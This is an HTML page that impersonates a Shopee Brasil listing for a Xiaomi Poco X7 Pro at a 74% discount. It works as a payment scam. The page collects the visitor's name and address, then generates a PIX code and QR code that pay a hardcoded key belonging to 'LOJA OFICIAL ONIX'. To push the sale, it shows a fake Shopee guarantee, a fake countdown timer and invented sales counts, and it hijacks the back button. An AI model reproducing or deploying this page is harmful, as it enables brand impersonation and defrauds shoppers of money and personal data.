<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
    <title>Xiaomi Poco X7 Pro 5G | Shopee Brasil</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        :root { --shopee: #ee4d2d; --teal: #00bfa5; --bg: #f5f5f5; --shopee-blue: #002060; }
        * { margin: 0; padding: 0; box-sizing: border-box; }
        html, body { background: var(--bg); font-family: -apple-system, HelveticaNeue, sans-serif; overflow-x: hidden; width: 100%; }

        .top-nav { background: white; padding: 10px; display: flex; align-items: center; position: sticky; top: 0; z-index: 1000; border-bottom: 1px solid #eee; height: 50px; }
        .search-container { flex: 1; margin: 0 12px; position: relative; }
        .search-bar { width: 100%; border: none; background: #f0f0f0; padding: 8px 8px 8px 35px; border-radius: 2px; font-size: 14px; outline: none; }

        .main-slider { display: flex; overflow-x: auto; scroll-snap-type: x mandatory; scrollbar-width: none; background: white; position: relative; }
        .main-slider img { width: 100vw; scroll-snap-align: start; flex-shrink: 0; object-fit: contain; }

        .flash-sale-banner { background: linear-gradient(90deg, #ff4d2d, #ff8a00); color: white; padding: 8px 15px; display: flex; align-items: center; justify-content: space-between; }
        .flash-sale-left { display: flex; align-items: center; gap: 8px; font-weight: bold; font-style: italic; font-size: 16px; }
        .timer-box { display: flex; align-items: center; gap: 4px; font-style: normal; }
        .timer-unit { background: #000; color: #fff; padding: 2px 4px; border-radius: 2px; font-size: 12px; font-weight: bold; min-width: 22px; text-align: center; }

        .free-shipping-banner { background: var(--shopee-blue); color: white; padding: 8px 15px; display: flex; align-items: center; font-size: 14px; font-weight: bold; }
        .free-shipping-banner img { height: 18px; margin-right: 8px; }

        .product-card { background: white; padding: 15px; margin-bottom: 8px; position: relative; }
        .price-row { color: var(--shopee); font-size: 24px; font-weight: 500; display: flex; align-items: baseline; gap: 5px; }
        .old-price { color: #999; text-decoration: line-through; font-size: 14px; margin-bottom: 5px; }
        .discount-tag { background: rgba(238, 77, 45, 0.1); color: #ee4d2d; font-size: 11px; font-weight: bold; padding: 2px 4px; border-radius: 2px; margin-left: 8px; text-transform: uppercase; }

        .product-title { font-size: 15px; color: #222; line-height: 1.4; font-weight: 400; }
        .indicator-tag { background: #ee4d2d; color: white; font-size: 10px; padding: 1px 4px; border-radius: 2px; margin-right: 4px; display: inline-block; vertical-align: middle; }

        .footer { position: fixed; bottom: 0; width: 100%; height: 50px; background: white; display: flex; border-top: 1px solid #ddd; z-index: 1000; }
        .btn-buy { flex: 1; background: var(--shopee); color: white; border: none; font-weight: bold; font-size: 15px; cursor: pointer; }

        .modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.7); z-index: 2000; }
        .modal-content { position: absolute; bottom: 0; width: 100%; background: white; border-radius: 12px 12px 0 0; padding: 15px; max-height: 90vh; overflow-y: auto; }
        .opt-btn { background: #f5f5f5; border: 1px solid #f5f5f5; padding: 8px 12px; border-radius: 4px; font-size: 12px; margin: 4px; cursor: pointer; }
        .opt-btn.selected { border-color: var(--shopee); color: var(--shopee); background: #fff5f1; }
        .input-box { width: 100%; border: 1px solid #ddd; padding: 12px; border-radius: 4px; margin-bottom: 10px; font-size: 14px; outline: none; }
        .cep-row { display: flex; gap: 8px; margin-bottom: 10px; }
        .btn-cep { background: var(--shopee); color: white; border: none; padding: 0 15px; border-radius: 4px; font-size: 12px; cursor: pointer; font-weight: bold; }
        .btn-voltar { background: #eee; color: #555; border: none; width: 100%; height: 45px; border-radius: 4px; margin-top: 8px; font-weight: bold; cursor: pointer; font-size: 14px; }
        .garantia-shopee { display: flex; flex-direction: column; align-items: center; margin-bottom: 10px; color: var(--shopee); font-weight: 500; font-size: 12px; line-height: 1.2; text-align: center; }
        .garantia-shopee i { font-size: 20px; margin-bottom: 4px; }
    </style>
</head>
<body>

    <div class="top-nav">
        <a href="https://shopee.com.br/"><i class="fas fa-arrow-left" style="color:var(--shopee); font-size: 18px;"></i></a>
        <div class="search-container"><input type="text" class="search-bar" placeholder="Buscar na Shopee"></div>
        <i class="fas fa-shopping-cart" style="color:var(--shopee);"></i>
    </div>

    <div class="main-slider">
        <img src="https://down-br.img.susercontent.com/file/br-11134207-81z1k-meadx6k4pddue4">
    </div>

    <div class="flash-sale-banner">
        <div class="flash-sale-left"><i class="fas fa-bolt"></i> OFERTA RELÂMPAGO</div>
        <div class="timer-box">
            <span style="font-size:12px; margin-right:5px;">TERMINA EM</span>
            <div class="timer-unit" id="h">01</div> :
            <div class="timer-unit" id="m">30</div> :
            <div class="timer-unit" id="s">00</div>
        </div>
    </div>

    <div class="free-shipping-banner">
        <img src="https://upload.wikimedia.org/wikipedia/commons/0/05/Flag_of_Brazil.svg" alt="Brasil">
        FRETE GRÁTIS <span>acima de R$10</span>
    </div>

    <div class="product-card">
        <div class="old-price">R$2.299,00</div>
        <div class="price-row">R$599,00 <span class="discount-tag">74% OFF</span> <span style="font-size:12px; color:#999; margin-left:10px;">6,4mil Vendidos</span></div>
        <div class="product-title">
            <span class="indicator-tag">Indicado</span>
            Xiaomi Poco X7 PRO 5G Global Version, Processador Dimensity 8400-Ultra, Câmera 64MP OIS, Bateria 6000mAh
        </div>
    </div>

    <div class="footer">
        <button class="btn-buy" onclick="openModal()">Compre Agora</button>
    </div>

    <div id="modal" class="modal">
        <div class="modal-content">
            <div id="selection-screen">
                <span style="font-size:14px; color:#555; margin-bottom:10px; display:block;">Escolha a Cor</span>
                <button class="opt-btn" onclick="selectVar(this)">AMARELO</button>
                <button class="opt-btn" onclick="selectVar(this)">PRETO</button>
                <button class="btn-buy" style="width:100%; height:45px; border-radius:4px; margin-top:20px;" onclick="goToForm()">PRÓXIMO</button>
                <button class="btn-voltar" onclick="document.getElementById('modal').style.display='none'">VOLTAR PARA O SITE</button>
            </div>

            <div id="form-screen" style="display:none;">
                <input type="text" id="nome" class="input-box" placeholder="Nome Completo">
                <div class="cep-row">
                    <input type="tel" id="cep" class="input-box" style="margin-bottom:0;" placeholder="CEP">
                    <button class="btn-cep" onclick="buscarCEP()">BUSCAR CEP</button>
                </div>
                <input type="text" id="rua" class="input-box" placeholder="Rua / Avenida">
                <input type="text" id="cidade" class="input-box" placeholder="Cidade / Estado">
                <button class="btn-buy" style="width:100%; height:45px; border-radius:4px;" onclick="finalizar()">GERAR PIX</button>
            </div>

            <div id="pix-screen" style="display:none; text-align:center;">
                <div class="garantia-shopee"><i class="fas fa-shield-alt"></i><span>Garantia Shopee</span></div>
                <p style="font-weight:bold; color:var(--teal);">Código PIX Gerado!</p>
                <div id="qrcode-area"></div>
                <div id="pix-copy-box" style="background:#f5f5f5; padding:10px; font-size:10px; word-break:break-all; margin:15px 0; border: 1px dashed #ccc;"></div>
                <button class="btn-buy" style="width:100%; height:40px; border-radius:4px;" onclick="copyPix()">COPIAR CÓDIGO</button>
            </div>
        </div>
    </div>

    <script>
        const CHAVE_PIX = "db0cbb53-17be-449c-89c8-9bffd8f6c7b5";
        
        // Função de CRC16 igual à que você tinha no Python
        function gerarPayloadPix(chave, valor, recebedor, city) {
            let payload = "00020101021226";
            let cInfo = `0014br.gov.bcb.pix01${chave.length.toString().padStart(2, '0')}${chave}`;
            payload += `${cInfo.length.toString().padStart(2, '0')}${cInfo}520400005303986`;
            let vStr = valor.toFixed(2);
            payload += `54${vStr.length.toString().padStart(2, '0')}${vStr}5802BR`;
            payload += `59${recebedor.length.toString().padStart(2, '0')}${recebedor}`;
            payload += `60${city.length.toString().padStart(2, '0')}${city}62070503***6304`;
            
            let crc = 0xFFFF;
            for (let i = 0; i < payload.length; i++) {
                crc ^= payload.charCodeAt(i) << 8;
                for (let j = 0; j < 8; j++) {
                    if (crc & 0x8000) crc = (crc << 1) ^ 0x1021;
                    else crc <<= 1;
                    crc &= 0xFFFF;
                }
            }
            return payload + crc.toString(16).toUpperCase().padStart(4, '0');
        }

        let totalSeconds = 5400;
        function updateTimer() {
            document.getElementById('h').innerText = String(Math.floor(totalSeconds / 3600)).padStart(2, '0');
            document.getElementById('m').innerText = String(Math.floor((totalSeconds % 3600) / 60)).padStart(2, '0');
            document.getElementById('s').innerText = String(totalSeconds % 60).padStart(2, '0');
            if(totalSeconds > 0) totalSeconds--;
        }
        setInterval(updateTimer, 1000);

        history.pushState(null, null, location.href);
        window.onpopstate = () => { window.location.href = "https://shopee.com.br/"; };

        function openModal() { document.getElementById('modal').style.display='block'; }
        function selectVar(btn) { 
            document.querySelectorAll('.opt-btn').forEach(b => b.classList.remove('selected'));
            btn.classList.add('selected'); 
        }
        function goToForm() { document.getElementById('selection-screen').style.display='none'; document.getElementById('form-screen').style.display='block'; }
        
        async function buscarCEP() {
            let cep = document.getElementById('cep').value.replace(/\D/g, '');
            let res = await fetch(`https://viacep.com.br/ws/${cep}/json/`);
            let d = await res.json();
            document.getElementById('rua').value = d.logradouro + ", " + d.bairro;
            document.getElementById('cidade').value = d.localidade + " / " + d.uf;
        }

        function finalizar() {
            let pix = gerarPayloadPix(CHAVE_PIX, 599.00, "LOJA OFICIAL ONIX", "SAO PAULO");
            document.getElementById('pix-copy-box').innerText = pix;
            document.getElementById('qrcode-area').innerHTML = `<img src="https://api.qrserver.com/v1/create-qr-code/?size=180x180&data=${pix}&color=ee4d2d">`;
            document.getElementById('form-screen').style.display='none';
            document.getElementById('pix-screen').style.display='block';
        }

        function copyPix() { navigator.clipboard.writeText(document.getElementById('pix-copy-box').innerText); alert('Copiado!'); }
    </script>
</body>
        </html>
